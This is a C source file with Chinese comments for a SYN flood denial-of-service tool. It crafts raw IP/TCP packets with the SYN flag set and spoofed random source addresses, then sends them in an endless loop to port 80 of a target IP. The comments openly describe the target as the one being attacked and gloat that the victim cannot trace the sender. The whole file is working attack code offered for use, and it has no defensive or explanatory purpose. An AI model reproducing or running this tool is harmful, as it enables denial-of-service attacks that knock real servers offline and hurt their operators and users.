#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <string.h>

#define DESTPORT 80 /*要攻击的端口(WEB)*/
#define LOCALPORT 8888
void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);
int main(int argc,char **argv)
{
        int sockfd;
        struct sockaddr_in addr;
        int on;
        on=1;
        if(argc!=2){
            fprintf(stderr,"Usage:%sIP\n\a",argv[0]);
            exit(1);
        }
 bzero(&addr,sizeof(struct sockaddr_in));
        addr.sin_family=AF_INET;
        addr.sin_port=htons(DESTPORT);
        inet_aton(argv[1],&addr.sin_addr);
        /* **** 使用IPPROTO_TCP创建一个TCP的原始套接****/
      sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
        if(sockfd<0){
             perror("socket Error");
             exit(1);
         }
/*设置IP数据包格式,告诉系统内核模块IP数据包由我们自己来填写*/ setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
         /****没有办法,只用超级护用户才可以使用原始套接字***/
        setuid(getuid()); 
send_tcp(sockfd,&addr); /*********发送炸弹了!!!!****/
   }
void send_tcp(int sockfd,struct sockaddr_in *addr)
{
        char buffer[100];/****用来放置我们的数据包****/
        struct ip *ip;
        struct tcphdr *tcp;
        int head_len;
        /*我们的数据包实际上没有任何内容,所以长度就是两个结构的长度*/
        head_len=sizeof(struct ip)+sizeof(struct tcphdr);
        bzero(buffer,100);
        /********填充IP数据包的头部,还记得IP的头格式吗******/
        ip=(struct ip *)buffer;
        ip->ip_v=IPVERSION;/**版本一般的是4**/
        ip->ip_hl=sizeof(struct ip)>>2;/**IP数据包的头部长度**/
        ip->ip_tos=0;/**服务类型**/
        ip->ip_len=htons(head_len);/**IP数据包的长度**/
        ip->ip_id=0;/**让系统去填写吧**/
        ip->ip_off=0;/**和上面一样,省点时间**/
        ip->ip_ttl=MAXTTL; /*最长的时间255*/
        ip->ip_p=IPPROTO_TCP;/**我们要发的是TCP包**/
        ip->ip_sum=0;/**校验和让系统去做**/
        ip->ip_dst=addr->sin_addr;/**我们攻击的对象**/
   printf("dest address is %s\n",inet_ntoa(addr->sin_addr));
/*******开始填写TCP数据包*****/
        tcp=(struct tcphdr *)(buffer+sizeof(struct ip));
        tcp->source=htons(LOCALPORT);
       tcp->dest=addr->sin_port;/**目的端口**/
        tcp->seq=random();
        tcp->ack_seq=0;
        tcp->doff=5;
        tcp->syn=1;/**我要建立连接**/
        tcp->check=0;
/**好了,一切都准备好了.服务器,你准备好了没有*/
while(1) {
/**你不知道我是从那里来的,慢慢的去等吧!**/
        ip->ip_src.s_addr=random();
        printf("addr is%d\n",ip->ip_src.s_addr);
        sendto(sockfd,buffer,head_len,0,(struct sockaddr *)addr,sizeof(struct sockaddr));
        }
}
